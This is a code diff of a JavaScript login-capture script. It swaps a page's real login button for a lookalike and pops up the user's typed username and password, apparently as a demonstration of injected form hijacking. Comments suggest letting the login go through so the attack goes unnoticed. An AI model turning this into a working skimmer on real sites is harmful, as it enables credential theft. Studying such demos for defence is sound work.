@@ -85,7 +85,6 @@ window.onload = function onWindowLoad() {
     const formFields = getFormFields(form);
 
     // remove the form submit button, which would cause the page to refresh
-    // ENHANCE: perhaps hide the old submit button and fire it after logging the user's information
     formFields.submit.remove();
 
     // add a dummy button that looks exactly like the real login button
@@ -95,7 +94,9 @@ window.onload = function onWindowLoad() {
     form.appendChild(formFields.submit);
 
     // do something malicious with their login information
-    formFields.submit.onclick = () => {
+    formFields.submit.onclick = (event) => {
+        // ENHANCE: we could remove this preventDefault() to allow the user to log in. This would possibly allow the attack to fly under their radar.
+        event.preventDefault();
         alert(`You've just been hacked! I now have your username and password.\n\nuser: ${formFields.user.value}\npass: ${formFields.pass.value}`)
     }
 } 
